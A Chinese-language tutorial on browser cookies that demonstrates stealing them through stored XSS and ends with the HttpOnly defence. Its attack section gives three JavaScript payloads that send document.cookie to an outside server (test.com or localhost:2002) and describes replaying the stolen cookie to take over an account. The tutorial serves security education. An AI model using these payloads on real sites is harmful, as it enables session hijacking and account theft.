# Stealing Cookie With XSS

利用XSS窃取客户端资料

---

## Cookie 介绍

简单来说，Cookie 是用户浏览网页时网站存储在用户机器上的小文本文件，文件里面记录了与用户相关的一些状态或者设置，比如用户名、ID、访问次数等，当用户下一次
访问这个网站的是，浏览器会把Cookie 信息发送给网站，网站从中读取信息，以便用户实现快速访问。

##Cookie 的作用
 
因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么。 所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。

在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。

Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，（如果该Cookie尚未到期）浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。

##Cookie 操作

通常我们需要设置一些 Cookie 属性，常见属性如下：

		Domain——设置关联 Cookie 的域名;
		Expires——通过给定一个过期时间来创建一个持久化Cookie;
		HttpOnly——用于避免Cookie 被 JavaScript 访问;
		Name——Cookie 的名称;
		Path——关联到 Cookie 的路径，默认为/;
		Value——读写Cookie的值;
		Secure——用于指定Cookie 需要通过安全 Socket 层连接传递;

创建一个 Cookie，需要提供 Cookie的名字、对应值、过期时间和相关路径等，以PHP语言为例，使用[setcookie()](http://php.net/manual/en/function.setcookie.php) 函数能轻易创建一个 Cookie，例如：

		<?
		setcookie('user_id',123);  //创建一个Cookie变量 user_id=123
		?>

若要删除 Cookie，设定 Cookie 的Expires 的值为过去时间即可：

		setcookie('user_id',0,time()-1); //删除 Cookie 变量


##Cookie 的安全

由于 Cookie 保存在客户端，这意味着它随时可能被窃取和滥用，如果我们登录百度后没有退出帐号，当其他成员使用同一台计算机登录时，利用之前的 Cookie，就能窃取我们帐号的“权限”。

例如使用Chrome的开发者工具查看 Cookie 信息：

![Cookie](img/Cookie.png)


##XSS攻击演示

接下来我就通过实际的攻击演示来告诉大家如何窃取Cookie并获取帐号的“权限”。

攻击者可以使用下面三种方式获取客户端的Cookie信息：

		<script>
		document.location="http://www.test.com/cookie.asp?cookie="+document.cookie
		</script>

		<img src="http://www.test.com/cookie.asp?cookie=+'document.cookie'"></img>

		var http = new XMLHttpRequest();
		http.open("GET", "http://localhost:2002?cookie="+encodeURIComponent(document.cookie), true);
		http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
		http.send();

上面攻击的本质都是触发一个HTTP GET 请求把 Cookie 信息作为URL的一部分参数传给攻击者的服务器然后攻击者
通过查看日志即可获取到 Cookie 信息，对于包含特殊字符的Cookie信息可以使用[encodeURIComponent](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent)函数进行编码传输。

首先把XSS攻击代码保存到用户的Profile中：

![XSS save](img/xss-1.png)

然后通过查看Profile触发XSS代码：

![XSS trige](img/xss-2.png)

然后通过开发者工具的Network面板查看到确实构造了一个带有 Cookie 信息的GET请求：

![XSS get](img/xss-3.png)

2002端口是本地的查看GET请求的服务器用来捕捉请求：

![XSS get](img/xss-4.png)

接下来打开一个隐身窗口（隐身窗口不会使用正常浏览的Cookie，所以可以模拟新用户）。然后通过注入Cookie的方式来完成模拟被盗用户
的登录。默认会被跳转到登录页面，因为没有登录嘛。

![XSS open](img/xss-5.png)

接下来打开开发者工具的Console页面,把得到的Cookie进行如下操作之后刷新页面就会发现：

![XSS console](img/xss-6.png)

我们已经登录到这个用户的账户了：

![XSS success](img/xss-7.png)

##Cookie 攻击防范

对于 Cookie 的偷取我们可以使用最有效的方法：设置Cookie的HttpOnly为true，这样JavaScript就无法访问了。

设置了HttpOnly属性之后在开发者工具里面可以看到HTTP选项已经打勾：

![XSS HttpOnly](img/xss-8.png)

可以看到监听服务器并没有获取到Cookie：

![XSS Cookie](img/xss-9.png)

这样就有效避免了Cookie被盗用的风险～